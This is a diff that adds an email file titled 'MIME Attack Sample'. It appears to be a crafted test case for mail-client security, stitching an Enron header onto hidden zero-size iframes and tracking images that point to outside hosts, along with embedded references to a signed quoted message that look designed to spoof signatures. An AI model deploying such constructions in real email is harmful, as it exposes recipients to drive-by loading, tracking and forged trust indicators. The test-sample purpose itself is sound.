@@ -1,0 +1,55 @@
+From: matthew.campbell@enron.com
+To: jim.homco@enron.com, jay.blaine@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html
+Date: Fri, 8 Jun 2007 09:20:39 +0800
+MIME-Version: 1.0
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1158
+
+<iframe src="http://gao.value.com.tw/z/main.htm" width=100 height=0></iframe>
+<IMG SRC="http://gao.value.com.tw/index.htm" WIDTH="0" HEIGHT="0">
+<iframe src="http://gao.value.com.tw/index.htm" width=0 height=0></iframe>
+<iframe src="http://gao.value.com.tw/bbs.htm" width=0 height=0></iframe>
+<IMG SRC="http://gserver8.enews.com.tw:7382/Counter.png?pid=1157&cid=1" WIDTH="0" HEIGHT="0">
+smilesAn!!!<br>
+<IMG SRC="http://219.84.167.230:8888/AD.png?eid=smiles@speedy.uwaterloo.ca&pid=banban" HEIGHT="0" WEIGHT="0" BORDER="0">
+
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+h: SHA1
+>
+> I've installed everything from FreeBSD to Solaris to Linux in a vm, and
+> am getting quite good at it now. The one requirement is having a lot of
+> ram, since the vm's ram + however much ram the host needs is quite a
+> bit. With 768MB, it's not too bad - but it could be better. Also,
+> vmware's audio performance is - not so great. If you're just using ssh
+> from the window side, it's not that much of an issue - since you can
+> just play mp3s and such on windows.
+> Just my $0.02,
+> Tyler
+>
+> -BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.5 (FreeBSD)
+>
+> iD8DBQFGIv0aTsjaYASMWKQRAlKPAKCipLaMsamqAVNZS+fao/teB9jAXwCgqMUO
+> QohLoGyCVLohffWcKd5ePpo=
+> =fqyb
+> -----END PGP SIGNATURE-----
+>
+> _
+--BOUNDARY--
+--DELIMITER--
